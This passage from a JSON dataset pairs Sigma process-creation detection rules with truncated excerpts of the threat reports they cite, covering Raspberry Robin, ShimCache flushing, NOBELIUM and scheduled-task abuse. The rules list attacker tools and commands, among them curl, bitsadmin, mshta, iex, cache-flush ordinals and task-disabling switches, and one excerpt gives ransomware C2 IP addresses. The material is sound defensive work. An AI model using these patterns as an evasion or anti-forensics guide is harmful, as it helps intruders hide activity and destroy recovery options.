      "related": [
        {
          "id": "36c5146c-d127-4f85-8e21-01bf62355d5a",
          "type": "obsolete"
        },
        {
          "id": "8823e85d-31d8-473e-b7f4-92da070f0fc6",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects suspicious usage of the ShellExec_RunDLL function to launch other commands as seen in the the raspberry-robin attack",
      "references": [
        "https://redcanary.com/blog/threat-intelligence/raspberry-robin/",
        "https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/",
        "https://github.com/SigmaHQ/sigma/issues/1009"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-01",
      "modified": "2022-12-30",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_openasrundll": {
          "CommandLine|contains": "ShellExec_RunDLL"
        },
        "selection_suspcli": {
          "CommandLine|contains": [
            "\\Desktop\\",
            "\\Temp\\",
            "\\Users\\Public\\",
            "comspec",
            "iex",
            "Invoke-",
            "msiexec",
            "odbcconf",
            "regsvr32"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_rundll32_susp_shellexec_execution.yml"
  },
  "463": {
    "url": "https://github.com/SigmaHQ/sigma/issues/1009",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Usage Of ShellExec_RunDLL",
      "id": "d87bd452-6da1-456e-8155-7dc988157b7d",
      "related": [
        {
          "id": "36c5146c-d127-4f85-8e21-01bf62355d5a",
          "type": "obsolete"
        },
        {
          "id": "8823e85d-31d8-473e-b7f4-92da070f0fc6",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects suspicious usage of the ShellExec_RunDLL function to launch other commands as seen in the the raspberry-robin attack",
      "references": [
        "https://redcanary.com/blog/threat-intelligence/raspberry-robin/",
        "https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/",
        "https://github.com/SigmaHQ/sigma/issues/1009"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-01",
      "modified": "2022-12-30",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_openasrundll": {
          "CommandLine|contains": "ShellExec_RunDLL"
        },
        "selection_suspcli": {
          "CommandLine|contains": [
            "\\Desktop\\",
            "\\Temp\\",
            "\\Users\\Public\\",
            "comspec",
            "iex",
            "Invoke-",
            "msiexec",
            "odbcconf",
            "regsvr32"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_rundll32_susp_shellexec_execution.yml"
  },
  "464": {
    "url": "https://redcanary.com/blog/threat-intelligence/raspberry-robin/",
    "markdown": "# Raspberry Robin gets the worm early Red Canary is tracking a worm spread by external drives that leverages Windows Installer to reach out to QNAP-associated domains and download a malicious DLL. *Originally published May 5, 2022. Last modified October 2, 2024.* --- Since fall 2021, Red Canary Intelligence has been tracking a cluster of malicious activity we call Raspberry Robin. Raspberry Robin was the seventh most prevalent threat we observed in 2022, as reported in our 2023 Threat Detection Report. Read on for details on what Raspberry Robin is, high-fidelity opportunities to detect known behaviors, and background on how",
    "sigma_rule": {
      "title": "Suspicious ShellExec_RunDLL Call Via Ordinal",
      "id": "8823e85d-31d8-473e-b7f4-92da070f0fc6",
      "related": [
        {
          "id": "d87bd452-6da1-456e-8155-7dc988157b7d",
          "type": "derived"
        }
      ],
      "status": "experimental",
      "description": "Detects suspicious call to the \"ShellExec_RunDLL\" exported function of SHELL32.DLL through the ordinal number to launch other commands.\nAdversary might only use the ordinal number in order to bypass existing detection that alert on usage of ShellExec_RunDLL on CommandLine.\n",
      "references": [
        "https://redcanary.com/blog/threat-intelligence/raspberry-robin/",
        "https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/",
        "https://github.com/SigmaHQ/sigma/issues/1009",
        "https://strontic.github.io/xcyclopedia/library/shell32.dll-65DA072F25DE83D9F83653E3FEA3644D.html"
      ],
      "author": "Swachchhanda Shrawan Poudel",
      "date": "2024-12-01",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.011"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_parent_img": {
          "ParentCommandLine|contains": "SHELL32.DLL"
        },
        "selection_parent_ordinal": {
          "ParentCommandLine|contains": [
            "#568",
            "#570",
            "#572",
            "#576"
          ]
        },
        "selection_susp_cli_parent": [
          {
            "ParentCommandLine|contains": [
              "comspec",
              "iex",
              "Invoke-",
              "msiexec",
              "odbcconf",
              "regsvr32"
            ]
          },
          {
            "ParentCommandLine|contains": [
              "\\Desktop\\",
              "\\ProgramData\\",
              "\\Temp\\",
              "\\Users\\Public\\"
            ]
          }
        ],
        "selection_susp_child_img": {
          "Image|endswith": [
            "\\bash.exe",
            "\\bitsadmin.exe",
            "\\cmd.exe",
            "\\cscript.exe",
            "\\curl.exe",
            "\\mshta.exe",
            "\\msiexec.exe",
            "\\msxsl.exe",
            "\\odbcconf.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\regsvr32.exe",
            "\\schtasks.exe",
            "\\wmic.exe",
            "\\wscript.exe"
          ]
        },
        "condition": "all of selection_parent_* and 1 of selection_susp_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_rundll32_susp_shellexec_ordinal_execution.yml"
  },
  "465": {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/",
    "markdown": "# Raspberry Robin worm part of larger ecosystem facilitating pre-ransomware activity **October 27, 2022** --- > **April 2023 update** – Microsoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather. > > - **DEV-0206** is now tracked as **Mustard Tempest** > - **DEV-0243** is now tracked as **Manatee Tempest** > - **DEV-0950** is now tracked as **Lace Tempest** > - **DEV-0651** is now tracked as **Storm-0651** > - **DEV-0856** is now tracked as **Storm-0856** > > To learn about how the new taxonomy represents the origin, unique traits, and impact of threat",
    "sigma_rule": {
      "title": "Suspicious ShellExec_RunDLL Call Via Ordinal",
      "id": "8823e85d-31d8-473e-b7f4-92da070f0fc6",
      "related": [
        {
          "id": "d87bd452-6da1-456e-8155-7dc988157b7d",
          "type": "derived"
        }
      ],
      "status": "experimental",
      "description": "Detects suspicious call to the \"ShellExec_RunDLL\" exported function of SHELL32.DLL through the ordinal number to launch other commands.\nAdversary might only use the ordinal number in order to bypass existing detection that alert on usage of ShellExec_RunDLL on CommandLine.\n",
      "references": [
        "https://redcanary.com/blog/threat-intelligence/raspberry-robin/",
        "https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/",
        "https://github.com/SigmaHQ/sigma/issues/1009",
        "https://strontic.github.io/xcyclopedia/library/shell32.dll-65DA072F25DE83D9F83653E3FEA3644D.html"
      ],
      "author": "Swachchhanda Shrawan Poudel",
      "date": "2024-12-01",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.011"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_parent_img": {
          "ParentCommandLine|contains": "SHELL32.DLL"
        },
        "selection_parent_ordinal": {
          "ParentCommandLine|contains": [
            "#568",
            "#570",
            "#572",
            "#576"
          ]
        },
        "selection_susp_cli_parent": [
          {
            "ParentCommandLine|contains": [
              "comspec",
              "iex",
              "Invoke-",
              "msiexec",
              "odbcconf",
              "regsvr32"
            ]
          },
          {
            "ParentCommandLine|contains": [
              "\\Desktop\\",
              "\\ProgramData\\",
              "\\Temp\\",
              "\\Users\\Public\\"
            ]
          }
        ],
        "selection_susp_child_img": {
          "Image|endswith": [
            "\\bash.exe",
            "\\bitsadmin.exe",
            "\\cmd.exe",
            "\\cscript.exe",
            "\\curl.exe",
            "\\mshta.exe",
            "\\msiexec.exe",
            "\\msxsl.exe",
            "\\odbcconf.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\regsvr32.exe",
            "\\schtasks.exe",
            "\\wmic.exe",
            "\\wscript.exe"
          ]
        },
        "condition": "all of selection_parent_* and 1 of selection_susp_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_rundll32_susp_shellexec_ordinal_execution.yml"
  },
  "466": {
    "url": "https://github.com/SigmaHQ/sigma/issues/1009",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious ShellExec_RunDLL Call Via Ordinal",
      "id": "8823e85d-31d8-473e-b7f4-92da070f0fc6",
      "related": [
        {
          "id": "d87bd452-6da1-456e-8155-7dc988157b7d",
          "type": "derived"
        }
      ],
      "status": "experimental",
      "description": "Detects suspicious call to the \"ShellExec_RunDLL\" exported function of SHELL32.DLL through the ordinal number to launch other commands.\nAdversary might only use the ordinal number in order to bypass existing detection that alert on usage of ShellExec_RunDLL on CommandLine.\n",
      "references": [
        "https://redcanary.com/blog/threat-intelligence/raspberry-robin/",
        "https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/",
        "https://github.com/SigmaHQ/sigma/issues/1009",
        "https://strontic.github.io/xcyclopedia/library/shell32.dll-65DA072F25DE83D9F83653E3FEA3644D.html"
      ],
      "author": "Swachchhanda Shrawan Poudel",
      "date": "2024-12-01",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.011"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_parent_img": {
          "ParentCommandLine|contains": "SHELL32.DLL"
        },
        "selection_parent_ordinal": {
          "ParentCommandLine|contains": [
            "#568",
            "#570",
            "#572",
            "#576"
          ]
        },
        "selection_susp_cli_parent": [
          {
            "ParentCommandLine|contains": [
              "comspec",
              "iex",
              "Invoke-",
              "msiexec",
              "odbcconf",
              "regsvr32"
            ]
          },
          {
            "ParentCommandLine|contains": [
              "\\Desktop\\",
              "\\ProgramData\\",
              "\\Temp\\",
              "\\Users\\Public\\"
            ]
          }
        ],
        "selection_susp_child_img": {
          "Image|endswith": [
            "\\bash.exe",
            "\\bitsadmin.exe",
            "\\cmd.exe",
            "\\cscript.exe",
            "\\curl.exe",
            "\\mshta.exe",
            "\\msiexec.exe",
            "\\msxsl.exe",
            "\\odbcconf.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\regsvr32.exe",
            "\\schtasks.exe",
            "\\wmic.exe",
            "\\wscript.exe"
          ]
        },
        "condition": "all of selection_parent_* and 1 of selection_susp_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_rundll32_susp_shellexec_ordinal_execution.yml"
  },
  "467": {
    "url": "https://strontic.github.io/xcyclopedia/library/shell32.dll-65DA072F25DE83D9F83653E3FEA3644D.html",
    "markdown": "# shell32.dll - **File Path:** `C:\\Windows\\SysWOW64\\shell32.dll` - **Description:** Windows Shell Common Dll ## Hashes | Type | Hash | | ------ | ---------------------------------------------------------------------------------------------------------------------------------- | | MD5 | `65DA072F25DE83D9F83653E3FEA3644D` | | SHA1 | `51A222C8D9CD2E1372EADFD3E817BE490C76D990` | | SHA256 | `6E5DC1215721F2A9613AB776A532B9F361FD5CB7EBB97AAD7CC9038E908BE9B3` | | SHA384 | `8741B88CD499AAE330458BA5051C0FB3721CB6B4571DB74600633A3D4C1459AC74DBF90F6B66C60A534CC574A76548C4` | | SHA512 | `6DD8D638F9F1150CB9ACA42A17BC6CDE64A99E7AE49F2866F3F327118D196738F02D9DAFB569F5E7DCF0D8174C0D5FDD05D10115E6530BCF43AD8F22EE513D0B` | | SSDEEP | `98304:dRyeuv/NLIhpn78N1HrukS2xE3fhZ/wmfBuJtpeIuiruN:ONOpn7u4ZIMmtpFyN` | | IMP | `0D2910927D65B5393CCB1FB2A9A5A5CD` | | PESHA1 | `D1A96F4555110B054BA24ED85270B994DBCE7AE6` | | PE256 | `55D2B275E79DD223F772EA9AF6F88B5B12599ACD297B1715D8D514B1D2EB6590` | ## DLL Exports: | Function Name | Ordinal | Type | | ----------------------------------------------------------------------------- | ------- | ----------------- | | `ShellAboutW` | 567 | Exported Function | | `ShellExec_RunDLL` | 568 |",
    "sigma_rule": {
      "title": "Suspicious ShellExec_RunDLL Call Via Ordinal",
      "id": "8823e85d-31d8-473e-b7f4-92da070f0fc6",
      "related": [
        {
          "id": "d87bd452-6da1-456e-8155-7dc988157b7d",
          "type": "derived"
        }
      ],
      "status": "experimental",
      "description": "Detects suspicious call to the \"ShellExec_RunDLL\" exported function of SHELL32.DLL through the ordinal number to launch other commands.\nAdversary might only use the ordinal number in order to bypass existing detection that alert on usage of ShellExec_RunDLL on CommandLine.\n",
      "references": [
        "https://redcanary.com/blog/threat-intelligence/raspberry-robin/",
        "https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/",
        "https://github.com/SigmaHQ/sigma/issues/1009",
        "https://strontic.github.io/xcyclopedia/library/shell32.dll-65DA072F25DE83D9F83653E3FEA3644D.html"
      ],
      "author": "Swachchhanda Shrawan Poudel",
      "date": "2024-12-01",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.011"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_parent_img": {
          "ParentCommandLine|contains": "SHELL32.DLL"
        },
        "selection_parent_ordinal": {
          "ParentCommandLine|contains": [
            "#568",
            "#570",
            "#572",
            "#576"
          ]
        },
        "selection_susp_cli_parent": [
          {
            "ParentCommandLine|contains": [
              "comspec",
              "iex",
              "Invoke-",
              "msiexec",
              "odbcconf",
              "regsvr32"
            ]
          },
          {
            "ParentCommandLine|contains": [
              "\\Desktop\\",
              "\\ProgramData\\",
              "\\Temp\\",
              "\\Users\\Public\\"
            ]
          }
        ],
        "selection_susp_child_img": {
          "Image|endswith": [
            "\\bash.exe",
            "\\bitsadmin.exe",
            "\\cmd.exe",
            "\\cscript.exe",
            "\\curl.exe",
            "\\mshta.exe",
            "\\msiexec.exe",
            "\\msxsl.exe",
            "\\odbcconf.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\regsvr32.exe",
            "\\schtasks.exe",
            "\\wmic.exe",
            "\\wscript.exe"
          ]
        },
        "condition": "all of selection_parent_* and 1 of selection_susp_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_rundll32_susp_shellexec_ordinal_execution.yml"
  },
  "468": {
    "url": "https://medium.com/@blueteamops/shimcache-flush-89daff28d15e",
    "markdown": "# Shimcache Flush! A cleanup routine that can be performed by threat actors to flush the Shimcache to remove traces of their malicious activities. Shimcache aka AppCompatCache is a high valued artefact used for forensic analysis during cyber breaches. It holds records to detect evidence of execution or even existence of PEs. Latest OSs can hold up to 1024 entries (older entries gets rolled over). The parser of my choice is https://github.com/EricZimmerman/AppCompatCacheParser. Below are the commands which can be executed by threat actors on endpoints/servers to flush the cache. Note that changes to the cache is only written during reboot",
    "sigma_rule": {
      "title": "ShimCache Flush",
      "id": "b0524451-19af-4efa-a46f-562a977f792e",
      "status": "stable",
      "description": "Detects actions that clear the local ShimCache and remove forensic evidence",
      "references": [
        "https://medium.com/@blueteamops/shimcache-flush-89daff28d15e"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2021-02-01",
      "tags": [
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection1a": {
          "CommandLine|contains|all": [
            "rundll32",
            "apphelp.dll"
          ]
        },
        "selection1b": {
          "CommandLine|contains": [
            "ShimFlushCache",
            "#250"
          ]
        },
        "selection2a": {
          "CommandLine|contains|all": [
            "rundll32",
            "kernel32.dll"
          ]
        },
        "selection2b": {
          "CommandLine|contains": [
            "BaseFlushAppcompatCache",
            "#46"
          ]
        },
        "condition": "( selection1a and selection1b ) or ( selection2a and selection2b )"
      },
      "fields": [
        "Image",
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_rundll32_susp_shimcache_flush.yml"
  },
  "469": {
    "url": "https://www.microsoft.com/en-us/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/",
    "markdown": "# GoldMax, GoldFinder, and Sibot: Analyzing NOBELIUM’s layered persistence **March 4, 2021** --- ### April 2023 update **Microsoft Threat Intelligence** has shifted to a new threat actor naming taxonomy aligned around the theme of weather. NOBELIUM is now tracked as **Midnight Blizzard**. ### April 15, 2021 update We updated this blog with new indicators of compromise, including files, domains, and C2 decoy traffic, released by Cybersecurity & Infrastructure Security Agency (CISA) in Malware Analysis Report MAR-10327841-1.v1 – SUNSHUTTLE. --- Microsoft continues to work with partners and customers to expand our knowledge of the threat actor behind the nation-state cyberattacks that",
    "sigma_rule": {
      "title": "Suspicious Rundll32 Activity Invoking Sys File",
      "id": "731231b9-0b5d-4219-94dd-abb6959aa7ea",
      "status": "test",
      "description": "Detects suspicious process related to rundll32 based on command line that includes a *.sys file as seen being used by UNC2452",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2021-03-05",
      "modified": "2022-10-09",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.011"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection1": {
          "CommandLine|contains": "rundll32.exe"
        },
        "selection2": {
          "CommandLine|contains": [
            ".sys,",
            ".sys "
          ]
        },
        "condition": "all of selection*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_rundll32_sys.yml"
  },
  "470": {
    "url": "https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/",
    "markdown": "# Qbot and Zerologon Lead To Full Domain Compromise **Categories:** adfind, cobaltstrike, Qbot **Published on:** February 21, 2022 In this intrusion (from November 2021), a threat actor gained its initial foothold in the environment through the use of Qbot (a.k.a. Quakbot/Qakbot) malware. Soon after execution of the Qbot payload, the malware established C2 connectivity and created persistence on the beachhead. Successful exploitation of the Zerologon vulnerability (CVE-2020-1472) allowed the threat actors to obtain domain admin privileges. This level of access was abused to deploy additional Cobalt Strike beacons and consequently pivot to other sensitive hosts within the network. The threat",
    "sigma_rule": {
      "title": "Suspicious Schtasks Execution AppData Folder",
      "id": "c5c00f49-b3f9-45a6-997e-cfdecc6e1967",
      "status": "test",
      "description": "Detects the creation of a schtask that executes a file from C:\\Users\\<USER>\\AppData\\Local",
      "references": [
        "https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/"
      ],
      "author": "pH-T (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-03-15",
      "modified": "2022-07-28",
      "tags": [
        "attack.execution",
        "attack.persistence",
        "attack.t1053.005",
        "attack.t1059.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\schtasks.exe",
          "CommandLine|contains|all": [
            "/Create",
            "/RU",
            "/TR",
            "C:\\Users\\",
            "\\AppData\\Local\\"
          ],
          "CommandLine|contains": [
            "NT AUT",
            " SYSTEM "
          ]
        },
        "filter": {
          "ParentImage|contains|all": [
            "\\AppData\\Local\\Temp\\",
            "TeamViewer_.exe"
          ],
          "Image|endswith": "\\schtasks.exe",
          "CommandLine|contains": "/TN TVInstallRestore"
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_schtasks_appdata_local_system.yml"
  },
  "471": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1490/T1490.md#atomic-test-8---windows---disable-the-sr-scheduled-task",
    "markdown": "# T1490 - Inhibit System Recovery ## Description from ATT&CK Adversaries may delete or remove built-in operating system data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery. (Citation: Talos Olympic Destroyer 2018) (Citation: FireEye WannaCry 2017) This may deny access to available backups and recovery options. Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact. (Citation: Talos",
    "sigma_rule": {
      "title": "Disable Important Scheduled Task",
      "id": "9ac94dc8-9042-493c-ba45-3b5e7c86b980",
      "related": [
        {
          "id": "7595ba94-cf3b-4471-aa03-4f6baa9e5fad",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects when adversaries stop services or processes by disabling their respective scheduled tasks in order to conduct data destructive activities",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1490/T1490.md#atomic-test-8---windows---disable-the-sr-scheduled-task",
        "https://twitter.com/MichalKoczwara/status/1553634816016498688",
        "https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/"
      ],
      "author": "frack113, Nasreddine Bencherchali (Nextron Systems), X__Junior",
      "date": "2021-12-26",
      "modified": "2024-08-25",
      "tags": [
        "attack.impact",
        "attack.t1489"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\schtasks.exe",
          "CommandLine|contains|all": [
            "/Change",
            "/TN",
            "/disable"
          ],
          "CommandLine|contains": [
            "\\Windows\\BitLocker",
            "\\Windows\\ExploitGuard",
            "\\Windows\\ExploitGuard\\ExploitGuard MDM policy Refresh",
            "\\Windows\\SystemRestore\\SR",
            "\\Windows\\UpdateOrchestrator\\",
            "\\Windows\\Windows Defender\\",
            "\\Windows\\WindowsBackup\\",
            "\\Windows\\WindowsUpdate\\"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_schtasks_disable.yml"
  },
  "472": {
    "url": "https://twitter.com/MichalKoczwara/status/1553634816016498688",
    "markdown": "# Post Jul 31, 2022 Ransomware Group and C2 seems to be still active A few new files added - 95.213.145.99 - 95.213.145.101 ```image Description: The image displays a directory listing for a server, showcasing various files available for download. The list includes executable files (e.g., 'artifact.exe', 'main.exe') and batch files (e.g., 'LOGOFALL.bat', 'shadowGuru.bat'). Some files are highlighted, indicating their potential relevance or importance in the context of cyber threats. The server IP address shown is '95.213.145.101', and it's accessed via port '8000', suggesting ongoing activity related to a ransomware group. Transcription: | Directory listing for / - artifact.exe -",
    "sigma_rule": {
      "title": "Disable Important Scheduled Task",
      "id": "9ac94dc8-9042-493c-ba45-3b5e7c86b980",
      "related": [
        {
          "id": "7595ba94-cf3b-4471-aa03-4f6baa9e5fad",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects when adversaries stop services or processes by disabling their respective scheduled tasks in order to conduct data destructive activities",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1490/T1490.md#atomic-test-8---windows---disable-the-sr-scheduled-task",
        "https://twitter.com/MichalKoczwara/status/1553634816016498688",
        "https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/"
      ],
      "author": "frack113, Nasreddine Bencherchali (Nextron Systems), X__Junior",
      "date": "2021-12-26",
      "modified": "2024-08-25",
      "tags": [
        "attack.impact",
        "attack.t1489"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\schtasks.exe",
          "CommandLine|contains|all": [
            "/Change",
            "/TN",
            "/disable"
          ],
          "CommandLine|contains": [
            "\\Windows\\BitLocker",
            "\\Windows\\ExploitGuard",
            "\\Windows\\ExploitGuard\\ExploitGuard MDM policy Refresh",
            "\\Windows\\SystemRestore\\SR",
            "\\Windows\\UpdateOrchestrator\\",
            "\\Windows\\Windows Defender\\",
            "\\Windows\\WindowsBackup\\",
            "\\Windows\\WindowsUpdate\\"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_schtasks_disable.yml"
  },
  "473": {
    "url": "https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/",
    "markdown": "",
    "sigma_rule": {
      "title": "Disable Important Scheduled Task",
      "id": "9ac94dc8-9042-493c-ba45-3b5e7c86b980",
      "related": [
        {
          "id": "7595ba94-cf3b-4471-aa03-4f6baa9e5fad",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects when adversaries stop services or processes by disabling their respective scheduled tasks in order to conduct data destructive activities",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1490/T1490.md#atomic-test-8---windows---disable-the-sr-scheduled-task",
        "https://twitter.com/MichalKoczwara/status/1553634816016498688",
        "https://thedfirreport.com/2021/10/18/icedid-to-xinglocker-ransomware-in-24-hours/"
      ],
      "author": "frack113, Nasreddine Bencherchali (Nextron Systems), X__Junior",
      "date": "2021-12-26",
      "modified": "2024-08-25",
      "tags": [
        "attack.impact",
        "attack.t1489"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": "\\schtasks.exe",
          "CommandLine|contains|all": [
            "/Change",
            "/TN",
            "/disable"
          ],
          "CommandLine|contains": [
            "\\Windows\\BitLocker",
            "\\Windows\\ExploitGuard",
            "\\Windows\\ExploitGuard\\ExploitGuard MDM policy Refresh",
            "\\Windows\\SystemRestore\\SR",
            "\\Windows\\UpdateOrchestrator\\",
            "\\Windows\\Windows Defender\\",
            "\\Windows\\WindowsBackup\\",
            "\\Windows\\WindowsUpdate\\"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_schtasks_disable.yml"
  },
  "474": {
    "url": "https://www.welivesecurity.com/2022/01/18/donot-go-do-not-respawn/",
    "markdown": "# DoNot Go! Do not respawn! **ESET researchers take a deep look into recent attacks carried out by Donot Team throughout 2020 and 2021, targeting government and military entities in several South Asian countries** **Published: 18 Jan 2022** ```image Alt: DoNot Go! Do not respawn! Description: The image depicts a close-up view through a circular aperture, resembling the view through a camera lens or a similar optical device. Inside the aperture, there is a display of code, predominantly in a dark color scheme with various programming elements like 'function', 'slice', and 'removeDonut'. The surrounding area is dark with a bluish",
    "sigma_rule": {
      "title": "Schedule Task Creation From Env Variable Or Potentially Suspicious Path Via Schtasks.EXE",
      "id": "81325ce1-be01-4250-944f-b4789644556f",
      "related": [
        {
          "id": "43f487f0-755f-4c2a-bce7-d6d2eec2fcf8",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects Schtask creations that point to a suspicious folder or an environment variable often used by malware",
      "references": [
        "https://www.welivesecurity.com/2022/01/18/donot-go-do-not-respawn/",
        "https://www.joesandbox.com/analysis/514608/0/html#324415FF7D8324231381BAD48A052F85DF04",
        "https://blog.talosintelligence.com/gophish-powerrat-dcrat/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-02-21",
      "modified": "2024-10-28",
      "tags": [
        "attack.execution",
        "attack.t1053.005"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_1_create": {
          "Image|endswith": "\\schtasks.exe",
          "CommandLine|contains": " /create "
        },
        "selection_1_all_folders": {
          "CommandLine|contains": [
            ":\\Perflogs",
            ":\\Users\\All Users\\",
            ":\\Users\\Default\\",
            ":\\Users\\Public",
            ":\\Windows\\Temp",
            "\\AppData\\Local\\",
            "\\AppData\\Roaming\\",
            "%AppData%",
            "%Public%"
          ]
        },
        "selection_2_parent": {
          "ParentCommandLine|endswith": "\\svchost.exe -k netsvcs -p -s Schedule"
        },
        "selection_2_some_folders": {
          "CommandLine|contains": [
            ":\\Perflogs",
            ":\\Windows\\Temp",
            "\\Users\\Public",
            "%Public%"
          ]
        },
        "filter_optional_other": [
          {
            "ParentCommandLine|contains": "unattended.ini"
          },
          {
            "CommandLine|contains": "update_task.xml"
          }
        ],
        "filter_optional_team_viewer": {
          "CommandLine|contains": "/Create /TN TVInstallRestore /TR"
        },
        "filter_optional_avira_install": {
          "CommandLine|contains|all": [
